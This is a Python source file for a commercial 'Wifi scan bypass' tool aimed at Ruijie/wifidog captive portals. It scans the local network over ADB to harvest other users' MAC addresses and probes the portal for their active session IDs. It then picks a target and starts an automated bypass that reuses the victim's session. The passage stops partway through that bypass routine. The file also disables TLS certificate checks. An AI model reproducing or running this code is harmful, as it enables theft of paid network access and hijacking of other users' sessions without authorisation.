import os
import re
import sys
import time
import json
import uuid
import socket
import hashlib
import base64
import string
import random
import shutil
import subprocess
import urllib3
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ==================== COLORS ====================
CYAN    = "\033[1;36m"
YELLOW  = "\033[1;33m"
GREEN   = "\033[1;32m"
RED     = "\033[1;31m"
BLUE    = "\033[0;34m"
WHITE   = "\033[1;37m"
MAGENTA = "\033[1;35m"
RESET   = "\033[0m"
DG      = "\033[0;32m"
DW      = "\033[0;37m"
BOLD    = "\033[1m"

# ==================== AES ====================
KEY_HEX = "000102030405060708090a0b0c0d0e0f"
IV_HEX  = "101112131415161718191a1b1c1d1e1f"
key = bytes.fromhex(KEY_HEX)
iv  = bytes.fromhex(IV_HEX)

def aes_encrypt(plain_text: str) -> str:
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(cipher.encrypt(pad(plain_text.encode(), AES.block_size))).decode()
    else:
        return base64.b64encode(plain_text.encode()).decode()

def aes_decrypt(token: str) -> str:
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(base64.b64decode(token)), AES.block_size).decode()
    else:
        return base64.b64decode(token).decode()

# ==================== PATHS & GLOBAL STATE ====================
DEV_FILE        = os.path.expanduser("~/.rj_devid")
KEY_FILE        = os.path.expanduser("~/.rj_key")
ADB_IP_FILE     = os.path.expanduser("~/.rj_adb_ip")
PORTAL_URL_FILE = os.path.expanduser("~/.rj_portal_url")
GATEWAY_FILE    = os.path.expanduser("~/.rj_gateway")
MAC_FILE        = os.path.expanduser("~/.rj_mac")

SELECTED_MAC    = None
SELECTED_NAME   = "Unknown"
PORTAL_URL      = None       # Set in Option 2, used in Option 3 & 7
SCANNED_DEVICES = []         # Set in Option 2
ACTIVE_DEVICES  = []         # Set in Option 3
GATEWAY_IP      = None       # Set in Option 1

# ==================== DEVICE ID ====================
def get_device_id() -> str:
    if os.path.exists(DEV_FILE):
        return open(DEV_FILE).read().strip()
    seed = socket.gethostname()
    try:
        seed += str(uuid.getnode())
    except:
        pass
    h = hashlib.sha256(seed.encode()).hexdigest()[:12].upper()
    dev_id = f"DEV-{h}"
    with open(DEV_FILE, "w") as f:
        f.write(dev_id)
    return dev_id

DEVICE_ID = get_device_id()

# ==================== KEY / LICENSE ====================
def load_expiry():
    if not os.path.exists(KEY_FILE):
        return None
    try:
        raw = open(KEY_FILE).read().strip()
        dec = aes_decrypt(raw)
        dev, ts = dec.split("|", 1)
        if dev != DEVICE_ID:
            return None
        exp = float(ts)
        if time.time() > exp:
            return None
        return exp
    except:
        return None

REVOKED_SENTINEL = "REVOKED"

def save_key(key_str: str):
    try:
        dec = aes_decrypt(key_str.strip())
        dev, ts = dec.split("|", 1)
        if dev != DEVICE_ID:
            return None
        exp = float(ts)
        with open(KEY_FILE, "w") as f:
            f.write(key_str.strip())
        if time.time() > exp:
            return REVOKED_SENTINEL
        return exp
    except:
        return None

def fmt_expiry(ts: float) -> str:
    remain = max(0, int(ts - time.time()))
    d = remain // 86400
    h = (remain % 86400) // 3600
    m = (remain % 3600) // 60
    return f"{d}d {h}h {m}min"

# ==================== BANNER ====================
SKYBY_ART = [
    r"   _____   _  __ __     __   ____   __     __",
    r"  / ____| | |/ / \ \   / /  |  _ \  \ \   / /",
    r" | (___   | ' /   \ \_/ /   | |_) |  \ \_/ / ",
    r"  \___ \  |  <     \   /    |  _ <    \   /  ",
    r"  ____) | | . \     | |     | |_) |    | |   ",
    r" |_____/  |_|\_\    |_|     |____/     |_|   ",
]

def term_width() -> int:
    try:
        return shutil.get_terminal_size().columns
    except:
        return 60

def cprint(text: str, color: str = ""):
    clean = re.sub(r'\033\[[0-9;]*m', '', text)
    p = max(0, (term_width() - len(clean)) // 2)
    print(" " * p + color + text + RESET)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def _sep() -> str:
    return f"{YELLOW}{'-' * term_width()}{RESET}"

def print_header(expiry=None):
    clear()
    print()
    for line in SKYBY_ART:
        cprint(line, GREEN)
    print()
    cprint("[ Wifi scan bypass ]", YELLOW)
    cprint("Telegram -> @paingzin3521_ux", GREEN)
    print(_sep())
    print(f"{DG}[*] Device ID : {CYAN}{DEVICE_ID}{RESET}")
    if expiry:
        print(f"{DG}[*] Expiry    : {GREEN}{fmt_expiry(expiry)}{RESET}")
    else:
        print(f"{DG}[*] Expiry    : {RED}Not Registered{RESET}")
    if SELECTED_MAC:
        print(f"{DG}[*] Target MAC: {YELLOW}{SELECTED_MAC}{RESET}  ({SELECTED_NAME})")
    if PORTAL_URL:
        short_url = PORTAL_URL[:55] + "..." if len(PORTAL_URL) > 58 else PORTAL_URL
        print(f"{DG}[*] Portal URL: {CYAN}{short_url}{RESET}")
    if GATEWAY_IP:
        print(f"{DG}[*] Gateway IP: {GREEN}{GATEWAY_IP}{RESET}")
    print(_sep())

# ==================== KEY SCREEN ====================
def key_screen() -> float:
    while True:
        clear()
        print()
        for line in SKYBY_ART:
            cprint(line, GREEN)
        print()
        cprint("[ Wifi scan bypass ]", YELLOW)
        print()
        cprint("Telegram -> @paingzin3521_ux", GREEN)
        print(_sep())
        print(f"{DG}[*] Device ID : {CYAN}{DEVICE_ID}{RESET}")
        print(f"{DG}[*] Expiry    : {RED}Not Registered{RESET}")
        print(_sep())
        print()
        key_in = input(f"  {YELLOW}Enter Key : {RESET}").strip()
        if not key_in:
            continue
        result = save_key(key_in)
        if result and result != REVOKED_SENTINEL:
            print()
            print(f"  {GREEN}+----------------------------------+{RESET}")
            print(f"  {GREEN}|  Key Accepted!                   |{RESET}")
            print(f"  {GREEN}|  Expiry : {fmt_expiry(result):<22}|{RESET}")
            print(f"  {GREEN}+----------------------------------+{RESET}")
            time.sleep(1.8)
            return result
        elif result == REVOKED_SENTINEL:
            print()
            print(f"  {RED}+----------------------------------+{RESET}")
            print(f"  {RED}|  *** KEY REVOKED ***             |{RESET}")
            print(f"  {RED}|  Your license has been           |{RESET}")
            print(f"  {RED}|  deactivated by Admin.           |{RESET}")
            print(f"  {RED}+----------------------------------+{RESET}")
            print()
            input(f"  {YELLOW}Press Enter... {RESET}")
        else:
            print()
            print(f"  {RED}+----------------------------------+{RESET}")
            print(f"  {RED}|  Invalid Key!                    |{RESET}")
            print(f"  {RED}|  Contact Admin to get your key.  |{RESET}")
            print(f"  {RED}+----------------------------------+{RESET}")
            print()
            input(f"  {YELLOW}Press Enter to retry... {RESET}")

# ==================== MENU ====================
def print_menu(expiry):
    print_header(expiry)
    print(f"  {GREEN}[1] WiFi Setup{RESET}")
    print(f"  {YELLOW}[2] MAC Scan{RESET}")
    print(f"  {GREEN}[3] Active Check{RESET}")
    print(f"  {YELLOW}[4] Select Target{RESET}")
    print(f"  {YELLOW}[5] AES Encrypt Tool{RESET}")
    print(f"  {YELLOW}[6] Encode Session URL{RESET}")
    print(f"  {GREEN}[7] Auto Bypass{RESET}")
    print(f"  {RED}[8] Delete Current Key{RESET}")
    print(f"  {RED}[0] Exit{RESET}")
    print(_sep())

# ==================== HELPERS ====================
def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def check_adb():
    try:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        lines = result.stdout.splitlines()
        for line in lines[1:]:
            if line.strip() and "device" in line and "offline" not in line:
                return True
        return False
    except:
        return False

def get_last_adb_ip():
    if os.path.exists(ADB_IP_FILE):
        return open(ADB_IP_FILE).read().strip()
    return None

def save_adb_ip(ip_port: str):
    with open(ADB_IP_FILE, "w") as f:
        f.write(ip_port.strip())

# ==================== PORTAL URL PERSISTENCE ====================
def load_portal_url():
    if os.path.exists(PORTAL_URL_FILE):
        url = open(PORTAL_URL_FILE).read().strip()
        return url if url else None
    return None

def save_portal_url(url: str):
    with open(PORTAL_URL_FILE, "w") as f:
        f.write(url.strip())

def load_saved_gateway():
    if os.path.exists(GATEWAY_FILE):
        return open(GATEWAY_FILE).read().strip()
    return None

def save_gateway(ip: str):
    with open(GATEWAY_FILE, "w") as f:
        f.write(ip.strip())

def load_saved_mac():
    if os.path.exists(MAC_FILE):
        data = open(MAC_FILE).read().strip()
        if "|" in data:
            mac, name = data.split("|", 1)
            return mac.strip(), name.strip()
        return data.strip(), "Unknown"
    return None, None

def save_mac(mac: str, name: str = "Unknown"):
    with open(MAC_FILE, "w") as f:
        f.write(f"{mac}|{name}")

# ==================== AUTO PORTAL DETECTION ====================
def auto_detect_portal_url():
    """Detect captive portal URL via ADB HTTP redirect."""
    test_urls = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://www.msftconnecttest.com/redirect",
        "http://captive.apple.com",
        "http://www.google.com",
    ]
    for test_url in test_urls:
        try:
            output = subprocess.check_output(
                ["adb", "shell", "curl", "-si", "--max-time", "5",
                 "--location-trusted", test_url],
                stderr=subprocess.DEVNULL, timeout=12
            ).decode(errors="ignore")
            m = re.search(r'[Ll]ocation:\s*(http[^\r\n]+)', output)
            if m:
                url = m.group(1).strip()
                if "ruijie" in url or "wifidog" in url or "portal" in url or "auth" in url:
                    return url
            # Also check for redirect inside response body
            m2 = re.search(r'https?://[^\s"\'<>]+(?:wifidog|portal|auth|ruijie)[^\s"\'<>]+', output)
            if m2:
                return m2.group(0).strip()
        except:
            continue
    # Fallback: try adb shell am broadcast for captive portal
    try:
        output = subprocess.check_output(
            ["adb", "shell", "dumpsys", "connectivity"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="ignore")
        m = re.search(r'(https?://[^\s]+(?:wifidog|portal|auth|ruijie)[^\s]+)', output)
        if m:
            return m.group(1).strip()
    except:
        pass
    return None

# ==================== SILENT ADB CONNECT ====================
def silent_adb_connect() -> bool:
    """Try to connect ADB silently using saved IP. Returns True if connected."""
    # Already connected?
    if check_adb():
        return True
    # Try saved IP
    last_ip = get_last_adb_ip()
    if last_ip:
        try:
            r = subprocess.run(["adb", "connect", last_ip],
                               capture_output=True, text=True, timeout=8)
            if "connected" in r.stdout.lower() and "unable" not in r.stdout.lower():
                return True
        except:
            pass
    return False

def is_internet_available():
    """Returns True if internet is reachable (8.8.8.8 responds)."""
    try:
        param = '-n' if os.name == 'nt' else '-c'
        result = subprocess.run(
            ['ping', param, '1', '-W', '1', '8.8.8.8'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3
        )
        return result.returncode == 0
    except:
        pass
    # fallback: try socket
    try:
        socket.setdefaulttimeout(2)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
        return True
    except:
        return False

def get_gateway_ip():
    """Try to find gateway IP via ip route, or via ADB."""
    try:
        output = subprocess.check_output("ip route", shell=True, stderr=subprocess.DEVNULL).decode()
        match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        if match:
            return match.group(1)
    except:
        pass
    if check_adb():
        try:
            output = subprocess.check_output(["adb", "shell", "ip", "route"],
                                             stderr=subprocess.DEVNULL).decode()
            match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if match:
                return match.group(1)
            # fallback: first gateway-ish IP
            match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if match:
                base = ".".join(match.group(1).split(".")[:3])
                return base + ".1"
        except:
            pass
    return None

def print_progress_bar(current, total, suffix=""):
    percent = (current / total) * 100 if total > 0 else 0
    filled = int(percent / 5)
    bar = "█" * filled + "░" * (20 - filled)
    sys.stdout.write(f"\r{YELLOW}Progress: |{bar}| {current}/{total} ({percent:.0f}%) {suffix}{RESET}")
    sys.stdout.flush()

# ==================== VENDOR DB ====================
OFFLINE_VENDORS = {
    "BC:D8:BB": "Apple", "D6:DD:D1": "Realme", "F8:AB:82": "Xiaomi/Poco",
    "C2:37:76": "Redmi", "5C:D0:6E": "Xiaomi", "0A:13:EA": "Apple",
    "4A:9E:DC": "Apple", "7A:47:DF": "Apple", "5E:F2:91": "Apple",
    "C6:12:93": "Oppo",  "DA:C3:AF": "Tecno", "7E:7F:F4": "Oppo",
    "22:B1:C6": "Samsung","62:26:F1": "Apple", "DA:EB:DC": "Xiaomi",
    "D6:C5:AA": "Redmi", "6A:A9:C0": "Redmi", "EC:21:50": "Vivo",
    "FA:F9:95": "Oppo",  "C8:1E:C2": "Itel",  "62:DA:06": "Xiaomi",
    "4A:C1:6C": "Apple", "8E:F8:1D": "Infinix","A6:0E:8B": "Oppo",
    "4A:55:45": "Poco",  "C4:B2:5B": "Router/Gateway","8E:35:3F": "Oppo",
    "5E:A0:1B": "Vivo",  "7E:38:84": "Oppo",  "82:99:5B": "Itel",
    "FA:57:54": "Apple", "C2:33:21": "Xiaomi", "DE:75:6A": "Unknown",
    "90:CB:A3": "Unknown","96:E2:07": "Apple", "52:84:E2": "Tecno",
    "C4:AB:B2": "Vivo",  "C2:0C:96": "Vivo",  "F2:15:5A": "Redmi",
    "1E:30:57": "Vivo",  "0A:09:7D": "Redmi", "CE:D5:2B": "Redmi",
    "3E:DF:A5": "Redmi", "12:CD:C6": "Redmi", "B6:A6:25": "Vivo",
    "72:33:28": "Redmi", "C6:59:19": "Xiaomi", "A2:04:DD": "Honor",
    "A2:CC:CD": "Oppo",  "66:A2:61": "Unknown"
}

def get_vendor_offline(mac):
    prefix = mac[:8].upper()
    return OFFLINE_VENDORS.get(prefix, "Unknown")

# ==================== OPTION 1: WIFI SETUP ====================
def option_wifi_setup(expiry):
    global SCANNED_DEVICES, ACTIVE_DEVICES, SELECTED_MAC, SELECTED_NAME, GATEWAY_IP
    print_header(expiry)
    print(f"\n{CYAN}[*] Initializing Setup Process...{RESET}")
    time.sleep(0.4)

    # Check internet — must NOT be available
    print(f"{CYAN}[*] Checking current session & unbinding...{RESET}")
    time.sleep(0.4)
    if is_internet_available():
        print()
        print(f"{RED}╔══════════════════════════════════════════╗{RESET}")
        print(f"{RED}║  ⚠  INTERNET DETECTED — SETUP BLOCKED   ║{RESET}")
        print(f"{RED}╠══════════════════════════════════════════╣{RESET}")
        print(f"{RED}║  Internet detected. Blocked.             ║{RESET}")
        print(f"{RED}║  Connect WiFi only (no voucher yet)      ║{RESET}")
        print(f"{RED}║  then run Setup again.                   ║{RESET}")
        print(f"{RED}╚══════════════════════════════════════════╝{RESET}")
        print()
        input(f"{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    # Find gateway IP
    print(f"{CYAN}[*] Fetching network configuration...{RESET}")
    time.sleep(0.5)
    gw = get_gateway_ip()
    if gw:
        GATEWAY_IP = gw
        save_gateway(gw)
        w   = term_width()
        box = min(w - 4, 46)
        bdr = "─" * box
        print(f"\n{GREEN}┌{bdr}┐{RESET}")
        print(f"{GREEN}│{RESET}{CYAN}{'  Router IP Found!':^{box}}{GREEN}│{RESET}")
        print(f"{GREEN}├{bdr}┤{RESET}")
        print(f"{GREEN}│{RESET}  {WHITE}Router IP  : {GREEN}{GATEWAY_IP:<{box-15}}{GREEN}│{RESET}")
        print(f"{GREEN}└{bdr}┘{RESET}\n")
    else:
        print(f"{YELLOW}[!] Router IP not found (ADB not connected yet?){RESET}")

    # Clear old data
    SCANNED_DEVICES = []
    ACTIVE_DEVICES  = []
    SELECTED_MAC    = None
    SELECTED_NAME   = "Unknown"

    print(f"{GREEN}[ ✓ ] Setup Completed! (Device lists cleared){RESET}")
    print()
    input(f"{DW}Press Enter to return...{RESET}")

# ==================== OPTION 2: MAC SCAN ====================
def adb_connect_step():
    """Connect ADB. Reuse saved connection if same WiFi (same gateway). Returns True if connected."""
    # Already connected — check if same WiFi via gateway
    if check_adb():
        saved_gw  = load_saved_gateway()
        cur_gw    = get_gateway_ip()
        if saved_gw and cur_gw and saved_gw == cur_gw:
            print(f"{GREEN}[ ✓ ] ADB already connected (same WiFi: {cur_gw}){RESET}")
            return True
        elif not saved_gw:
            # No saved gateway yet — accept connection as-is
            if cur_gw:
                save_gateway(cur_gw)
            print(f"{GREEN}[ ✓ ] ADB already connected{RESET}")
            return True
        else:
            # Different WiFi — need to reconnect
            print(f"{YELLOW}[!] WiFi changed (was {saved_gw}, now {cur_gw or '?'}){RESET}")

    # Try saved IP silently
    last_ip = get_last_adb_ip()
    if last_ip:
        print(f"{CYAN}[*] ADB reconnect to {last_ip}...{RESET}")
        try:
            r = subprocess.run(["adb", "connect", last_ip],
                               capture_output=True, text=True, timeout=8)
            if "connected" in r.stdout.lower() and "unable" not in r.stdout.lower():
                cur_gw = get_gateway_ip()
                if cur_gw:
                    save_gateway(cur_gw)
                print(f"{GREEN}[ ✓ ] ADB connected to {last_ip}{RESET}")
                return True
        except:
            pass

    # Ask user for IP:PORT
    print(f"{YELLOW}[*] ADB not connected. Enter device IP:PORT.{RESET}")
    ip_port = input(f"{YELLOW}[?] ADB IP:PORT (e.g. 192.168.20.100:5555): {RESET}").strip()
    if not ip_port:
        print(f"{YELLOW}[!] Skipping ADB connection.{RESET}")
        return False
    try:
        r = subprocess.run(["adb", "connect", ip_port],
                           capture_output=True, text=True, timeout=8)
        if "connected" in r.stdout.lower() and "unable" not in r.stdout.lower():
            save_adb_ip(ip_port)
            cur_gw = get_gateway_ip()
            if cur_gw:
                save_gateway(cur_gw)
            print(f"{GREEN}[ ✓ ] ADB connected to {ip_port}{RESET}")
            return True
        else:
            print(f"{RED}[-] ADB connection failed: {r.stdout.strip()}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")
        return False

def scan_network_via_adb():
    """Scan LAN using ADB and return list of {ip, mac} dicts."""
    global GATEWAY_IP
    # Get subnet from GATEWAY_IP first, then from ip route
    subnet = None
    if GATEWAY_IP:
        subnet = ".".join(GATEWAY_IP.split(".")[:3])
    
    if not subnet:
        try:
            output = subprocess.check_output(["adb", "shell", "ip", "route"],
                                             stderr=subprocess.DEVNULL).decode()
            m = re.search(r'src\s+(\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if m:
                subnet = m.group(1)
            else:
                # Fallback: find any IP and take its subnet
                m2 = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}', output)
                subnet = m2.group(1) if m2 else "192.168.1"
        except:
            subnet = "192.168.1"

    print(f"{YELLOW}[*] Scanning network ({subnet}.0/24)...{RESET}")

    # Ping sweep to populate ARP table
    ips = [f"{subnet}.{i}" for i in range(1, 255)]
    with ThreadPoolExecutor(max_workers=100) as ex:
        list(ex.map(
            lambda ip: subprocess.run(["adb", "shell", f"ping -c 1 -w 1 {ip}"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
            ips
        ))

    # Read ARP table from multiple sources
    results = []
    seen_macs = set()
    
    # Method 1: ip neigh show
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "neigh", "show"],
                                         stderr=subprocess.DEVNULL).decode()
        for line in output.splitlines():
            ip_m = re.search(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
            mac_m = re.search(r'lladdr\s+([0-9a-fA-F:]{17})', line)
            if ip_m and mac_m:
                ip = ip_m.group(1)
                mac = mac_m.group(1).lower()
                if ip.endswith(".1") or ip.endswith(".255") or mac in seen_macs:
                    continue
                seen_macs.add(mac)
                results.append({"ip": ip, "mac": mac})
    except:
        pass

    # Method 2: /proc/net/arp (Fallback for older devices or different permissions)
    if not results:
        try:
            output = subprocess.check_output(["adb", "shell", "cat", "/proc/net/arp"],
                                             stderr=subprocess.DEVNULL).decode()
            for line in output.splitlines()[1:]: # Skip header
                parts = line.split()
                if len(parts) >= 4:
                    ip = parts[0]
                    mac = parts[3].lower()
                    if mac == "00:00:00:00:00:00" or ip.endswith(".1") or mac in seen_macs:
                        continue
                    seen_macs.add(mac)
                    results.append({"ip": ip, "mac": mac})
        except:
            pass

    results.sort(key=lambda x: list(map(int, x['ip'].split('.'))))
    return results

def option_mac_scan(expiry):
    global SCANNED_DEVICES, PORTAL_URL
    print_header(expiry)
    print(f"\n{CYAN}[*] MAC Scan — Option 2{RESET}")
    print(_sep())

    # Step 1: ADB connect (reuse if same WiFi)
    print(f"\n{CYAN}[*] Checking ADB connection...{RESET}")
    connected = adb_connect_step()
    if not connected:
        print(f"{YELLOW}[!] ADB not connected. Cannot continue scan.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    print()
    # Step 2: Auto-detect Portal URL
    print(f"{CYAN}[*] Auto-detecting Portal URL...{RESET}")
    detected_url = auto_detect_portal_url()
    if detected_url:
        PORTAL_URL = detected_url
        save_portal_url(detected_url)
        short = detected_url[:60] + "..." if len(detected_url) > 63 else detected_url
        print(f"{GREEN}[ ✓ ] Portal URL detected:{RESET}")
        print(f"      {CYAN}{short}{RESET}")
    else:
        # Fallback: use saved URL if available
        saved = load_portal_url()
        if saved:
            PORTAL_URL = saved
            short = saved[:60] + "..." if len(saved) > 63 else saved
            print(f"{YELLOW}[!] Auto-detect failed. Using saved URL:{RESET}")
            print(f"      {CYAN}{short}{RESET}")
        else:
            print(f"{RED}[-] Could not detect Portal URL automatically.{RESET}")
            print(f"{YELLOW}[?] Enter Portal URL manually (or press Enter to skip):{RESET}")
            url_in = input(f"  {CYAN}Portal URL : {RESET}").strip()
            if url_in:
                PORTAL_URL = url_in
                save_portal_url(url_in)
            else:
                print(f"{RED}[-] No Portal URL. Cannot continue.{RESET}")
                input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
                return

    print()
    # Step 3: Scan
    devices = scan_network_via_adb()
    SCANNED_DEVICES = devices

    print()
    if devices:
        print(f"{GREEN}[ ✓ ] {len(devices)} devices found.{RESET}\n")
        print(f"{WHITE}Scanned Devices:{RESET}")
        print(f"{DW}{'IP Address':<20} {'MAC Address'}{RESET}")
        print(f"{DG}{'-' * 40}{RESET}")
        for d in devices:
            print(f"{GREEN}{d['ip']:<20}{RESET}{YELLOW}{d['mac']}{RESET}")
    else:
        print(f"{RED}[-] No devices found.{RESET}")

    print()
    input(f"{DW}Press Enter to return to main menu...{RESET}")

# ==================== OPTION 3: ACTIVE CHECK ====================
def check_mac_active(portal_url, mac):
    """Returns session_id string if MAC is active on portal, else None."""
    try:
        api_url = portal_url.replace("/auth/wifidogAuth/login", "/api/auth/wifidog?stage=portal&")
        new_url = replace_mac(api_url, mac)
        # If no mac= param found, append
        if "mac=" not in new_url:
            sep = "&" if "?" in new_url else "?"
            new_url = new_url + f"{sep}mac={mac}"
        sess = requests.Session()
        sess.headers.update({"User-Agent": "Dalvik/2.1.0"})
        resp = sess.get(new_url, timeout=6, allow_redirects=True, verify=False)
        s_id = None
        if "sessionId=" in resp.url:
            s_id = resp.url.split("sessionId=")[1].split("&")[0]
        if not s_id:
            m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', resp.text)
            if m:
                s_id = m.group(1)
        return s_id
    except:
        return None

def option_active_check(expiry):
    global ACTIVE_DEVICES
    print_header(expiry)
    print(f"\n{CYAN}[*] Active Check — Option 3{RESET}")
    print(_sep())

    if not SCANNED_DEVICES:
        print(f"\n{RED}[-] Scanned device list empty!{RESET}")
        print(f"{YELLOW}[!] Please run Option 2 (MAC Scan) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    if not PORTAL_URL:
        print(f"\n{RED}[-] Portal URL not found!{RESET}")
        print(f"{YELLOW}[!] Please run Option 2 (MAC Scan) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    total = len(SCANNED_DEVICES)
    print(f"\n{YELLOW}[*] Testing {total} devices...{RESET}")
    print(_sep())
    print(f"\n{GREEN}Active Devices Found:{RESET}")
    print(f"{WHITE}{'IP Address':<20} {'MAC Address'}{RESET}")
    print(f"{DG}{'-' * 40}{RESET}")

    found = []
    lock = __import__('threading').Lock()

    def worker(idx, device):
        ip  = device['ip']
        mac = device['mac']
        suffix_text = f"| Testing: {ip}"
        print_progress_bar(idx, total, suffix_text)
        sid = check_mac_active(PORTAL_URL, mac)
        if sid:
            with lock:
                device['session_id'] = sid
                found.append(device)
                # Print above progress
                sys.stdout.write("\r" + " " * 80 + "\r")
                print(f"{GREEN}{ip:<20}{YELLOW}{mac}{RESET}")
        return idx

    # Run sequentially to show live progress (as in screenshots)
    for i, dev in enumerate(SCANNED_DEVICES, 1):
        worker(i, dev)

    # Final bar
    print_progress_bar(total, total, "Done!")
    print()
    print()

    ACTIVE_DEVICES = found
    if found:
        print(f"{GREEN}[ ✓ ] {len(found)} active devices saved.{RESET}")
    else:
        print(f"{YELLOW}[!] No active devices found.{RESET}")

    print()
    input(f"{DW}Press Enter to return to main menu...{RESET}")

# ==================== OPTION 4: SELECT TARGET ====================
def option_select_target(expiry):
    global SELECTED_MAC, SELECTED_NAME
    print_header(expiry)
    print(f"\n{CYAN}[*] Select Target — Option 4{RESET}")
    print(_sep())

    if not ACTIVE_DEVICES:
        print(f"\n{RED}[-] Active device list empty!{RESET}")
        print(f"{YELLOW}[!] Please run Option 3 (Active Check) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    print(f"\n{GREEN}Active Devices:{RESET}")
    for i, d in enumerate(ACTIVE_DEVICES, 1):
        print(f"{WHITE}{i:>2}) {GREEN}{d['ip']:<20}{YELLOW}{d['mac']}{RESET}")

    print()
    choice = input(f"{CYAN}Select device number (1-{len(ACTIVE_DEVICES)}): {RESET}").strip()
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(ACTIVE_DEVICES):
            SELECTED_MAC  = ACTIVE_DEVICES[idx]['mac']
            SELECTED_NAME = ACTIVE_DEVICES[idx].get('name', ACTIVE_DEVICES[idx]['ip'])
            save_mac(SELECTED_MAC, SELECTED_NAME)
            print()
            print(f"{GREEN}[ ✓ ] Target MAC set  : {WHITE}{SELECTED_MAC}{RESET}")
            print(f"{GREEN}[ ✓ ] Target IP       : {WHITE}{ACTIVE_DEVICES[idx]['ip']}{RESET}")
            print(f"{DG}[*] MAC saved — next restart go straight to Option 7{RESET}")
            time.sleep(1.5)
        else:
            print(f"{RED}[-] Invalid selection.{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}[-] Invalid input.{RESET}")
        time.sleep(1)

# ==================== OPTION 5: AES TOOL ====================
def option_aes_encrypt(expiry):
    print_header(expiry)
    while True:
        text = input(f"\n{YELLOW}Enter text to encrypt (or 'exit'): {RESET}").strip()
        if text == 'exit':
            break
        print(f"{GREEN}[+] Encrypted: {CYAN}{aes_encrypt(text)}{RESET}")

# ==================== OPTION 6: ENCODE URL ====================
def option_encode_session(expiry):
    print_header(expiry)
    mac = input(f"{YELLOW}Enter MAC: {RESET}").strip().lower()
    url = input(f"{YELLOW}Enter URL: {RESET}").strip()
    if mac and url:
        new_url = replace_mac(url, mac) + "WHOAMI1000"
        encoded = base64.b64encode(new_url.encode()).decode()
        print(f"\n{GREEN}[+] Encoded: {CYAN}{encoded}{RESET}")
    input(f"\n{YELLOW}[!] Press Enter...{RESET}")

# ==================== OPTION 7: AUTO BYPASS ====================
def _fetch_session_id(session, portal_url, mac):
    """Fetch a fresh sessionId from the portal for the given MAC."""
    try:
        api_url = portal_url.replace("/auth/wifidogAuth/login", "/api/auth/wifidog?stage=portal&")
        new_url = replace_mac(api_url, mac)
        if "mac=" not in new_url:
            sep = "&" if "?" in new_url else "?"
            new_url = new_url + f"{sep}mac={mac}"
        resp = session.get(new_url, timeout=10, allow_redirects=True, verify=False)
        s_id = None
        if "sessionId=" in resp.url:
            s_id = resp.url.split("sessionId=")[1].split("&")[0]
        if not s_id:
            m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', resp.text)
            if m:
                s_id = m.group(1)
        return s_id
    except:
        return None

def _do_logon(session, logon_url):
    """Attempt logon via logonUrl, trying multiple IP variants if needed."""
    ip_match = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", logon_url)
    candidates = [logon_url]
    if ":2060" in logon_url and ip_match:
        orig_ip = ip_match.group()
        for alt_ip in ["10.44.77.240", "10.44.77.1", "10.44.77.254"]:
            if alt_ip != orig_ip:
                candidates.append(logon_url.replace(orig_ip, alt_ip))
    for url in candidates:
        try:
            r = session.get(url, timeout=10, verify=False, allow_redirects=True)
            if r.status_code == 200:
                return True
        except:
            continue
    return False

def run_bypass_for_mac(portal_url, mac, cached_sid=None, verbose=False):
    """
    Returns (success, session_id).
    Tries up to 3 rounds:
      Round 1 — use cached_sid if provided (from Option 3 scan)
      Round 2 — fetch a fresh sessionId
      Round 3 — fetch another fresh sessionId after short delay
    """
    def _log(msg):
        if verbose:
            print(msg)

    pwn_url = "https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US"

    for attempt in range(1, 4):
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": "Dalvik/2.1.0"})

            # Decide which sessionId to use this round
            if attempt == 1 and cached_sid:
                s_id = cached_sid
                _log(f"{DG}[*] Round {attempt}: Using cached sessionId...{RESET}")
            else:
                _log(f"{DG}[*] Round {attempt}: Fetching fresh sessionId...{RESET}")
                s_id = _fetch_session_id(session, portal_url, mac)

            if not s_id:
                _log(f"{YELLOW}[!] Round {attempt}: No sessionId — retrying...{RESET}")
                time.sleep(1.5)
                continue

            _log(f"{DG}[*] Round {attempt}: SessionId → {CYAN}{s_id[:20]}...{RESET}")

